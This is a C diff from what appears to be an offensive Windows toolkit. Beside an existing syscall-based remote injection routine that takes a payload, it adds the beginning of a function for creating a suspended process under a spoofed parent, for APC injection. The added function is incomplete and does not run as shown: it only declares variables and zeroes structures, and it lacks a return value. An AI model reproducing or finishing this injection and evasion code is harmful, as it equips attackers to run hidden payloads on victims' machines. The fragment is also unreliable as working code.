@@ -258,3 +258,23 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 
 	return TRUE;
 }
+
+// Function used for APC Injection with PPID Spoofing
+BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) 
+{
+	CHAR                               lpPath[MAX_PATH * 2];
+	CHAR                               WnDr[MAX_PATH];
+
+	SIZE_T                             sThreadAttList = NULL;
+	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;
+
+	STARTUPINFOEXA                     SiEx = { 0 };
+	PROCESS_INFORMATION                Pi = { 0 };
+
+	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
+	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
+
+	// Setting the size of the structure
+	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
+}
